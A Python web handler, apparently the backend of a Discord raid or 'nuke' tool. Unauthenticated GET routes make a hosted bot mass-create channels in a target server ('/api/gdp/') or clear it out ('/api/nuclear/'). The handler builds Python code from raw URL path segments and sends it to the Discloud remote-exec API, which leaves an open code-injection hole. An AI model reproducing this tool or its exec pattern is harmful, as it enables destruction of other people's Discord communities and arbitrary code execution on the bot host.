from http.server import BaseHTTPRequestHandler
import json
import os
import requests
import time

# ==================== CONFIGURAÇÕES ====================

DISCLOUD_TOKEN = os.getenv('DISCLOUD_TOKEN', '')
BOT_ID = os.getenv('BOT_ID', '1386082293533249546')
API_BASE = "https://api.discloud.app/v2"

class handler(BaseHTTPRequestHandler):
    
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, PUT, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type, api-token')
        self.end_headers()
        
        path = self.path
        print(f"📡 {path}")
        
        # ========== ROTAS ==========
        if path == '/api/test':
            result = {"status": "ok", "time": time.time()}
        
        elif path == '/api/status':
            result = self.get_status()
        
        elif path == '/api/servidores':
            result = self.get_servidores()
        
        elif path.startswith('/api/gdp/'):
            partes = path.split('/')
            if len(partes) >= 4:
                server_id = partes[3]
                qtd = partes[4] if len(partes) >= 5 else '100'
                result = self.executar_comando(f"criar_canais {server_id} {qtd}")
            else:
                result = {"erro": "URL inválida"}
        
        elif path.startswith('/api/nuclear/'):
            partes = path.split('/')
            if len(partes) >= 4:
                server_id = partes[3]
                result = self.executar_comando(f"limpar_servidor {server_id}")
            else:
                result = {"erro": "URL inválida"}
        
        else:
            result = {"erro": "rota não encontrada"}
        
        self.wfile.write(json.dumps(result).encode())
    
    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, PUT, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type, api-token')
        self.end_headers()
    
    def _call_api(self, endpoint, method='GET', data=None):
        """Chama a API da Discloud"""
        headers = {'api-token': DISCLOUD_TOKEN}
        url = f"{API_BASE}{endpoint}"
        
        try:
            if method == 'GET':
                r = requests.get(url, headers=headers, timeout=5)
            else:
                r = requests.put(url, headers=headers, json=data, timeout=5)
            
            if r.status_code == 200:
                return r.json()
            return {"erro": f"HTTP {r.status_code}"}
        except:
            return {"erro": "falha na conexão"}
    
    def get_status(self):
        """Status do bot"""
        return self._call_api(f"/app/{BOT_ID}/status")
    
    def get_servidores(self):
        """Lista servidores"""
        data = self._call_api(f"/app/{BOT_ID}")
        if 'guilds' in str(data):
            return {"servidores": data.get('guilds', [])}
        return {"servidores": []}
    
    def executar_comando(self, comando):
        """Executa comando no bot"""
        # Comando para chamar as funções diretas
        codigo = f"""
import asyncio

async def run():
    try:
        if '{comando}'.startswith('criar_canais'):
            partes = '{comando}'.split()
            server_id = partes[1]
            qtd = partes[2]
            resultado = await criar_canais(server_id, qtd)
            print(f"✅ {{resultado}}")
        
        elif '{comando}'.startswith('limpar_servidor'):
            partes = '{comando}'.split()
            server_id = partes[1]
            resultado = await limpar_servidor(server_id)
            print(f"☢️ {{resultado}}")
    
    except Exception as e:
        print(f"❌ {{e}}")

asyncio.run(run())
"""
        return self._call_api(f"/app/{BOT_ID}/exec", 'PUT', {"cmd": codigo})